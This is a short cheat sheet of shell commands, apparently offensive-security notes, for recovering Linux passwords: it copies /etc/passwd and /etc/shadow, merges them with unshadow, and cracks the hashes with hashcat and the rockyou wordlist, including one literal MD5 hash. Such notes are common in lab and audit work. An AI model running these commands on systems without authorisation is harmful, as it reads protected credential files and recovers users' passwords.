
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O



[hash-with-salt]            hashcat -m 1710 -a 0 hash:salt /usr/share/wordlists/rockyou.txt
                            hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt

